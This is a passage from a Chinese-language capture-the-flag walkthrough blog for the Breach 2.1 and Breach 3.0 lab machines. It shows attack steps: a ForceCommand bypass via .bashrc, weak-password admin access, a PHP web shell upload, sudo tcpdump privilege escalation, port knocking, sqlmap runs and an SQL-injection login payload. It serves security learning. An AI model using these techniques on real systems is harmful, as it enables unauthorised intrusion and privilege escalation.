+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453280.png" srcset="/img/loading.gif" lazyload alt="1731830190921"></p>
+<p>确实和wp说的一样 返回的shell非常不稳定 直接给断开了  </p>
+<p>使用另外一个模块 <strong>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong>  </p>
+<p>配置好相关东西之后直接运行 可以得到一个meterpreter类型的会话  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453321.png" srcset="/img/loading.gif" lazyload alt="1731831044717"></p>
+<p>成功进去shell因为能成功执行命令  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453476.png" srcset="/img/loading.gif" lazyload alt="1731831265447"></p>
+<p>同时里面有python环境 可以用python升级tty  </p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> <br></code></pre></td></tr></table></figure>
+
+<p>可以去看看为什么 ssh登录成功之后 80端口才能打开  </p>
+<p>查看&#x2F;etc&#x2F;ssh这个目录下面的sshd_config这个配置文件  </p>
+<p>注意不是ssh_config  少了一个d 二者还是有点区别的   </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453546.png" srcset="/img/loading.gif" lazyload alt="1731831942981"></p>
+<p>里面写的是  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">UsePAM <span class="hljs-built_in">yes</span><br>AllowUsers peter<br>ForceCommand /usr/bin/startme<br>AddressFamily inet<br></code></pre></td></tr></table></figure>
+
+<p>只有peter才能登录 并且登录成功后会执行&#x2F;usr&#x2F;bin&#x2F;startme 这玩意 再加上 <strong>ForceCommand</strong>这个玩意   </p>
+<p>跟进这个东西 里面写的是  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash                                                                                                                                                                                                                                                                                                                        </span><br><span class="hljs-built_in">sudo</span> /etc/init.d/apache2 start &amp;&gt; /dev/null  <br></code></pre></td></tr></table></figure>
+
+<p>很清楚了 会启动apache服务 并且将所有的输出(包括错误输出)给重定向到&#x2F;dev&#x2F;null 即不显示也不保存  </p>
+<p><strong>所以说只有使用peter的身份成功ssh登录之后 阿帕奇服务才会启动 80端口才能打开 因为ForceCommand的存在 一旦执行完 <code>/usr/bin/startme</code>后 SSH 会话随之结束，因为没有提供持续运行的交互式 Shell 所以 ssh立马断开</strong>  </p>
+<p><em><strong>绕过</strong></em>  </p>
+<p>利用之前msf得到的shell 直接执行  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> “<span class="hljs-built_in">exec</span> sh” &gt; .bashrc<br></code></pre></td></tr></table></figure>
+
+<p>写入<code>exec sh</code> 这串指令到bash的配置文件里面去  </p>
+<p>然后重新连接 就可以绕过ForceCommand的限制  </p>
+<p>原因是  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453579.png" srcset="/img/loading.gif" lazyload alt="1731836439975"></p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453599.png" srcset="/img/loading.gif" lazyload alt="image-20250109195610676"></p>
+<p>关于这个<strong>exec命令</strong>  </p>
+<p>用于用指定的命令替换当前的 Shell 进程。  </p>
+<p> 当使用 <code>exec</code> 时，当前的 Shell 或脚本进程将被指定的命令替换。原进程终止，新进程（即指定的命令）将接管，且新的命令会在同一个进程 ID (PID) 下运行。并不会创建一个新的子进程，它直接替换当前进程。  </p>
+<p>一旦 <code>exec</code> 执行，当前的进程会被完全替换，因此无法返回到原来的 Shell 或脚本。</p>
+<p>例如</p>
+<p> <img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453322.png" srcset="/img/loading.gif" lazyload alt="1731843266722"></p>
+<p>观察进程号为122147的进程 发现运行的东西改变了 但是进程号没变  </p>
+<p>再例如  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453258.png" srcset="/img/loading.gif" lazyload alt="1731843395739"></p>
+<p>执行完pwd进程之后 由于没有新的进程 所以说直接退出了ssh  </p>
+<p>所以说如果先sudo su 再exec 会由sudo进程退回普通的进程  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453360.png" srcset="/img/loading.gif" lazyload alt="1731843493639"></p>
+<hr>
+<p>接着上面 通过查看主机开放的端口 发现有个2323的端口开在127.0.0.1上 而不是0.0.0.0:2323 所以说扫描不到  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453586.png" srcset="/img/loading.gif" lazyload alt="1731843708308"></p>
+<p>使用telnet命令去查看  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">2323</span><br></code></pre></td></tr></table></figure>
+
+<p>看起来是一个坐标 并且后面还让我登录  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">2323</span><br><span class="hljs-attribute">Trying</span> <span class="hljs-number">127.0.0.1</span>...<br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">127.0.0.1</span>.<br><span class="hljs-attribute">Escape</span> character is &#x27;^]&#x27;.<br><span class="hljs-attribute">29</span> <span class="hljs-number">45</span>&#x27;<span class="hljs-number">46</span><span class="hljs-string">&quot; N 95 22&#x27;59&quot;</span> W <br><span class="hljs-attribute">breach2</span> login:<br></code></pre></td></tr></table></figure>
+
+<p>首先 坐标是一个名叫 Houston 的城市  </p>
+<p>使用之前在这个靶机上面发现的用户名 milton 配合这个城市的名字作为密码成功登录  </p>
+<p>提示  </p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Whose stapler <span class="hljs-keyword">is</span> <span class="hljs-keyword">it</span>?<br></code></pre></td></tr></table></figure>
+
+<p>这是谁的订书机?  </p>
+<p>第一个反应是找这个文件 没找到  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / stapler*或者 <span class="hljs-built_in">find</span> / *stapler 或者 <span class="hljs-built_in">find</span> / *stapler*<br></code></pre></td></tr></table></figure>
+
+<p>看wp知道 使用这个  </p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -rl stapler <span class="hljs-regexp">/ 2&gt;/</span>dev/<span class="hljs-keyword">null</span>  <br></code></pre></td></tr></table></figure>
+
+<p>这个命令可以从系统中搜索包含指定关键词 <code>stapler</code> 的文件，并输出匹配文件的路径。  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453773.png" srcset="/img/loading.gif" lazyload alt="1731844905374"></p>
+<p>出来了很多 那两个进程文件去翻 没翻到 看那个python文件  </p>
+<p>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;cd.py  </p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">#!/usr/bin/python<br><br>import <span class="hljs-keyword">signal</span><br>import <span class="hljs-built_in">time</span><br>import os<br><br>s = <span class="hljs-keyword">signal</span>.<span class="hljs-keyword">signal</span>(<span class="hljs-keyword">signal</span>.SIGINT, <span class="hljs-keyword">signal</span>.SIG_IGN)<br><br>countdown=<span class="hljs-number">3</span><br><br><span class="hljs-keyword">while</span> countdown &gt;<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br>        print(countdown)<br>        countdown -=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> countdown &lt;<span class="hljs-number">1</span>:<br>        question = raw_input(<span class="hljs-string">&quot;Whose stapler is it?&quot;</span>)<br><span class="hljs-keyword">if</span> question == <span class="hljs-string">&quot;mine&quot;</span>:<br>        os.system(<span class="hljs-string">&quot;echo &#x27;Woot!&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><br>        os.system(<span class="hljs-string">&quot;kill -9 %d&quot;</span>%(os.getppid()))<br>        <span class="hljs-keyword">signal</span>.<span class="hljs-keyword">signal</span>(<span class="hljs-keyword">signal</span>.SIGINT, s)<br></code></pre></td></tr></table></figure>
+
+<p>  看到这才明白 原来上面那个端口是要回答的意思  </p>
+<p>重新连接端口并回答  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453674.png" srcset="/img/loading.gif" lazyload alt="1731845177167"></p>
+<p>根据python文件回答正确后 切换成了milton用户  </p>
+<p>再次检查端口开放情况  </p>
+<p>发现 0.0.0.0:8888 开放了 访问看看  </p>
+<p>是一个商店的页面 是由一个叫 oscommerce 提供支持的  </p>
+<p>想根据版本搜一下历史漏洞 但是找不到这个的具体版本  </p>
+<p>目录扫描扫到admin目录  </p>
+<p> 直接admin&#x2F;admin 弱密码 进入后台  </p>
+<p>后台有个文件管理处  </p>
+<p>并且注意到 这个是存在于 靶机的这个目录下  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453964.png" srcset="/img/loading.gif" lazyload alt="6a9bb81b-0e6a-411a-ae2d-60233854671c"></p>
+<p>而当前目录都不可写 所以没办法写入后门  </p>
+<p>尝试寻找其他可以写入东西的文件或者是目录 因为知道这个网站的结构了 尝试直接去靶机上面翻  </p>
+<p>使用这个命令来查找  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> /var/www/html2/oscommerce -perm <span class="hljs-attribute">-o</span>=w <br></code></pre></td></tr></table></figure>
+
+<p>查出来 &#x2F;var&#x2F;www&#x2F;html2&#x2F;oscommerce&#x2F;includes&#x2F;work 这个目录是可以写的 回到网站上去 进入这个目录  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453005.png" srcset="/img/loading.gif" lazyload alt="1731847380187"></p>
+<p>写入shell  </p>
+<p>在浏览器直接访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">110.151</span>:<span class="hljs-number">8888</span><span class="hljs-regexp">/oscommerce/i</span>ncludes<span class="hljs-regexp">/work/</span>shell.php<br></code></pre></td></tr></table></figure>
+
+<p>可以收到返回的shell  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453198.png" srcset="/img/loading.gif" lazyload alt="1731847702787"></p>
+<p><strong>提权</strong>  </p>
+<p>查看sudo权限  </p>
+<p>发现能tcpdump  </p>
+<p>直接搜tcpdump的sudo提权  </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/10346043.html">https://www.cnblogs.com/zlgxzswjy/p/10346043.html</a>  </p>
+<p>最后成功提权  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453123.png" srcset="/img/loading.gif" lazyload alt="1731848392307"></p>
+<h3 id="breach-3-0"><a href="#breach-3-0" class="headerlink" title="breach 3.0"></a>breach 3.0</h3><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453272.png" srcset="/img/loading.gif" lazyload alt="1732352428082"></p>
+<hr>
+<p>全网唯二的完整版通关靶机记录  </p>
+<p><strong>也是全网第一个文章形式的完整版通关记录</strong></p>
+<p>里面会涉及到踩过的坑 学到的或者突发奇想到的或者涉及到的延伸出去的一切东西 所以说文章可能有点长  </p>
+<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/102541140">Zer0-hex</a> 文章里面很多地方参考了这位位于b站的大牛录制的通关视频 通篇学习其思路 真的牛!!  </p>
+<p><strong>靶机发现</strong>    </p>
+<p>使用arp-scan -l命令去进行</p>
+<p>得出来 靶机的地址为192.168.206.144  </p>
+<p>端口扫描  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453539.png" srcset="/img/loading.gif" lazyload alt="1732345762964"></p>
+<p>发现什么端口都没开放 明显不正常  </p>
+<p>有几种可能  </p>
+<p>第一种是 nmap执行的时候出错了 重新运行一下就可以  </p>
+<p>第二种是 我的扫描命令是针对于tcp端口的 可能对方没有开放任何的tcp端口 或许开放了udp端口  </p>
+<p>第三种情况是 可能对方设置了某些东西 必须得实现某些操作或者达到一些效果之后才能让端口打开 比如上一个靶机的sshd_config那个配置文件里面写的东西  再比如 <strong>端口敲门</strong>  </p>
+<p><strong>端口敲门</strong>  </p>
+<p>通过在特定顺序上访问（”敲门”）一组隐藏端口来触发某种预定义的操作，例如开启某个端口或执行安全策略。  </p>
+<p><strong>原理</strong>：</p>
+<ol>
+<li>目标主机的防火墙规则将特定端口隐藏或关闭。</li>
+<li>当用户以特定的顺序对某些端口发送数据包（敲门序列）时，主机识别这个序列并触发某种动作，例如打开某个端口或执行脚本。</li>
+<li>如果敲门序列正确，用户即可访问目标服务。</li>
+</ol>
+<p>通常使用<code>knock</code>这个命令来实现这个操作  </p>
+<p>假设目标主机需要敲门顺序 <code>12345, 54321, 13579</code> 来解锁某个服务  </p>
+<p>则命令为 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.1.10</span> <span class="hljs-number">12345</span> <span class="hljs-number">54321</span> <span class="hljs-number">13579</span><br></code></pre></td></tr></table></figure>
+
+<p>或者要求每个端口使用不同的协议 </p>
+<p>例如 第一个和第三个用tcp 第二个用udp  </p>
+<p>则 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.1.10</span> <span class="hljs-number">12345</span>:tcp <span class="hljs-number">54321</span>:udp <span class="hljs-number">13579</span>:tcp<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>回到上文 扫描udp试试  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -p- -sS -T4 -Pn --min-rate <span class="hljs-number">1000</span> -sU <span class="hljs-number">192.168.206.144</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453721.png" srcset="/img/loading.gif" lazyload alt="1732347973462"></p>
+<p>发现开放161端口 详细看看  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453843.png" srcset="/img/loading.gif" lazyload alt="1732348363911"></p>
+<p><strong>snmp</strong>  </p>
+<p>SNMP（Simple Network Management Protocol，简单网络管理协议）是一种用于网络管理的通信协议。它允许网络管理员监视网络设备的状态如路由器、交换机、服务器，并对其进行配置。 </p>
+<p>网上去找相关资料 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a>  </p>
+<p>直接利用  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snmpwalk</span> -Os -c public -v <span class="hljs-number">1</span> <span class="hljs-number">192.168.206.144</span>      <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453979.png" srcset="/img/loading.gif" lazyload alt="1732351436912"></p>
+<p>出来这些东西 里面可能有价值的东西   </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.4.0</span> = STRING: <span class="hljs-string">&quot;Email: Milton@breach.local - (545)-232-1876&quot;</span><br><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.5.0</span> = STRING: <span class="hljs-string">&quot;Initech-DMZ01&quot;</span><br><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.6.0</span> = STRING: <span class="hljs-string">&quot;Initech - is this thing on? I doubt anyone thinks to look here, anyways, I&#x27;ve left myself a way back in and burn the place down once again.&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>邮箱: <a href="mailto:&#77;&#x69;&#x6c;&#116;&#x6f;&#x6e;&#64;&#x62;&#114;&#x65;&#97;&#99;&#x68;&#x2e;&#x6c;&#111;&#x63;&#x61;&#108;">Milton@breach.local</a>  </p>
+<p>(545)-232-1876 : 有点像 上面说到的敲门砖的端口  </p>
+<p>试一下  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.206.144</span> <span class="hljs-number">545</span> <span class="hljs-number">232</span> <span class="hljs-number">1876</span><br></code></pre></td></tr></table></figure>
+
+<p>重新扫描端口 </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453273.png" srcset="/img/loading.gif" lazyload alt="1732352190661"></p>
+<p>发现开放这些端口  </p>
+<p>使用telnet 或 nc 去探测端口上面运行的什么 发现似乎都没有什么东西</p>
+<p>尝试ssh连接看看  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453265.png" srcset="/img/loading.gif" lazyload alt="1732352348406"></p>
+<p>又是熟悉的邮箱加那串数字 看上去就是一个敲门砖  </p>
+<p>重复上面  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.206.144</span> <span class="hljs-number">555</span> <span class="hljs-number">423</span> <span class="hljs-number">1800</span> <br></code></pre></td></tr></table></figure>
+
+<p>然后再次进行端口扫描</p>
+<p> <img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453313.png" srcset="/img/loading.gif" lazyload alt="1732352986334"></p>
+<p>发现多了这样的一个8端口  </p>
+<p>使用nmap的-sV参数再次扫描一下  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453922.png" srcset="/img/loading.gif" lazyload alt="1732353102291"></p>
+<p>是一个http的端口  </p>
+<p>直接访问看看  </p>
+<p>访问之后 需要登录 <strong>账号是milton 密码是系列中第一个靶机得到的 thelaststraw</strong> </p>
+<p>登录成功</p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453059.png" srcset="/img/loading.gif" lazyload alt="1732353439539"></p>
+<p>源代码没什么东西 访问那个地址  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453125.png" srcset="/img/loading.gif" lazyload alt="1732354086276"></p>
+<p>是一个登录框  </p>
+<p>尝试弱密码 尝试sql注入 尝试之前靶机得到的密码都不能进去之后  </p>
+<p>开始目录扫描  </p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.206.144:8/&quot;</span>   <br></code></pre></td></tr></table></figure>
+
+<p>什么也没有 换一个位置  </p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.206.144:8/breach3&quot;</span>   <br></code></pre></td></tr></table></figure>
+
+<p>发现images和blog目录  </p>
+<p>images目录访问是403 看blog目录  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453453.png" srcset="/img/loading.gif" lazyload alt="1732363082233"></p>
+<p>注意到那个人名: samir  </p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">mailto:samir<span class="hljs-symbol">@breach</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<p>再试试目录扫描 换一个工具 使用dirb  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453495.png" srcset="/img/loading.gif" lazyload alt="1732363321028"></p>
+<p>这次出来的东西更多  </p>
+<p>不过上面的 <a target="_blank" rel="noopener" href="http://192.168.206.144:8/breach3/login.php">http://192.168.206.144:8/breach3/login.php</a> 这个地址虽然状态码写的是 200 但实际上里面一点东西都没有  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453594.png" srcset="/img/loading.gif" lazyload alt="1732370434496"></p>
+<p>下面两个地址写的是302 会重定向到 <a target="_blank" rel="noopener" href="http://192.168.206.144:8/breach3/thebobsadmin.php">http://192.168.206.144:8/breach3/thebobsadmin.php</a>  地址  </p>
+<p>但是 一访问上面的两个地址中的任意一个  一瞬间会进行多次重定向 导致它会提示你  </p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">该网页无法正常运作<br><span class="hljs-number">192.168.206.144</span> 将您重定向的次数过多。<br></code></pre></td></tr></table></figure>
+
+<p>所以也无法利用  </p>
+<p>回过头去看那个登录框 再次尝试sql注入  </p>
+<p>这次直接保存登录的请求包为1.txt </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453755.png" srcset="/img/loading.gif" lazyload alt="1732371533602"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -r 1.txt <span class="hljs-attribute">--auth-type</span>=Basic <span class="hljs-attribute">--auth-cred</span>=milton:thelaststraw <span class="hljs-attribute">--tamper</span>=equaltolike <span class="hljs-attribute">--level</span>=5 <span class="hljs-attribute">--risk</span>=3 <span class="hljs-attribute">--dbms</span>=mysql --dbs<br></code></pre></td></tr></table></figure>
+
+<p>使用如上命令去注入  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453832.png" srcset="/img/loading.gif" lazyload alt="1732371660849"></p>
+<p>他会问你是否要进行302重定向 上面分析过了 这里选择不要  </p>
+<p>但是还是没跑出来?  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453999.png" srcset="/img/loading.gif" lazyload alt="1732446063138"></p>
+<p>无奈选择手注  </p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27; or&#x27;<span class="hljs-number">1</span>&#x27;like&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>最后经过尝试 密码利用如上payload成功进去 同时账号名字为admin (有点奇怪 这么简单为什么没跑出来 可能是我工具出了点问题..)  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453257.png" srcset="/img/loading.gif" lazyload alt="1732448723446"></p>
+<p>进去之后 开始找功能点  点那个initech home进去再点第四个employee portal 最后进到这  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453394.png" srcset="/img/loading.gif" lazyload alt="1732449790806"></p>
+<p>再点右上角那个在线聊天  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453387.png" srcset="/img/loading.gif" lazyload alt="972e30f7-c1a3-4127-8254-1be28a26895c"></p>
+<p><strong>注意</strong> : 这里有一个坑  </p>
+<p>你在这个页面也就是这个url下面  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">206.144</span>:<span class="hljs-number">8</span><span class="hljs-regexp">/breach3/</span>thebobscloudhostingllc/index.php<br></code></pre></td></tr></table></figure>
+
+<p>直接去点他是没办法跳转的  </p>
+<p>因为你如果直接点他 url的最后面会自动加上一个#(可以通过f12查看那个地方 可以发现就是一个井号)  同时这个页面应该使用了ajax技术  但是井号后面没有任何东西 所以说页面不会进行刷新</p>
+<p><strong>AJAX</strong>（Asynchronous JavaScript and XML）是一种在Web开发中常用的技术，它允许网页在不重新加载整个页面的情况下与服务器进行数据交换和更新部分网页内容。  </p>
+<p>必须选择email那个页面 也就是url得变成  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">206.144</span>:<span class="hljs-number">8</span><span class="hljs-regexp">/breach3/</span>thebobscloudhostingllc/email.php<br></code></pre></td></tr></table></figure>
+
+<p>这个样子 再点那个在线聊天才能进行跳转(在这个页面下 f12查看在线聊天那个地方 超链接也从 # 变成了 &#x2F;livechat.php 这个样子)   </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453527.png" srcset="/img/loading.gif" lazyload alt="1732452046027"></p>
+<p>尝试随便输入东西并且提交  </p>
+<p>url变成了这样  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">206.144</span>:<span class="hljs-number">8</span><span class="hljs-regexp">/breach3/</span>thebobscloudhostingllc/livechat.php?searcher=Submit  <br></code></pre></td></tr></table></figure>
+
+<p>经过测试 后面进行get请求的参数是能够进行命令执行的  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453490.png" srcset="/img/loading.gif" lazyload alt="1732452217460"></p>
+<p>同时 这玩意似乎不能出网 所以说不能通过反弹shell来获取shell  </p>
+<p>现在我的身份是samir  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uid</span>=1003(samir) <span class="hljs-attribute">gid</span>=1003(samir) <span class="hljs-attribute">groups</span>=1003(samir),27(sudo)<br></code></pre></td></tr></table></figure>
+
+<p>看看有哪些用户 ls &#x2F;home  </p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">blumbergh mbolton milton peter samir thebobs troll</span>  <br></code></pre></td></tr></table></figure>
+
+<p>这个thebobs应该是类似于管理员之类的人 进去看看  </p>
+<p>查看到  </p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">drwxr-xr-x<span class="hljs-number"> 4 </span>thebobs thebobs<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.<br>drwxr-xr-x<span class="hljs-number"> 9 </span>root    root   <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span><span class="hljs-number"> 2016 </span>..<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs  <span class="hljs-number"> 48 </span>Nov <span class="hljs-number"> 2 </span><span class="hljs-number"> 2016 </span>.bash_history<br>-rw-r--r--<span class="hljs-number"> 1 </span>thebobs thebobs <span class="hljs-number"> 220 </span>Apr <span class="hljs-number"> 8 </span><span class="hljs-number"> 2014 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>thebobs thebobs<span class="hljs-number"> 3637 </span>Apr <span class="hljs-number"> 8 </span><span class="hljs-number"> 2014 